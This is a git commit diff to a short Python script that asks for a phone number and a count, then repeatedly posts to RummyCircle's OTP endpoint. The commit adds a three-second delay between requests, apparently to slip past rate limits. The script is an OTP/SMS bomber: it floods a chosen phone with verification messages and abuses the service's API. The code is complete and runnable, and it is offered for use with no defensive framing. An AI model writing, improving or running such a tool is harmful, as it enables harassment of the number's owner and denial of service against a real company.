a089921a2a05e9e7718c6d5383f1bb9b5d91dcc6
Achu <87751449+appuachu@users.noreply.github.com>
2023-01-15 11:22:52 +0530

    Update rummy_circle_otp.py

--- rummy_circle_otp.py
+++ rummy_circle_otp.py
@@ -1,5 +1,6 @@
 import json
 import requests
+import time
 num=input("enter the number :")
 req=int(input("enter the number of request to be send :"))
 url = 'https://www.rummycircle.com/api/fl/auth/v3/getOtp'
@@ -7,5 +8,6 @@ headers = {'Content-Type': 'application/json'}
 payload = {"mobile":num,"deviceId":"e6abe4d3-b210-4a5a-aa99-41a04b3fbd90","deviceName":"","refCode":"","isPlaycircle":False}
 
 for i in range(req):
+    time.sleep(3)
     response = requests.post(url, headers=headers, data=json.dumps(payload))
     print(response.status_code)
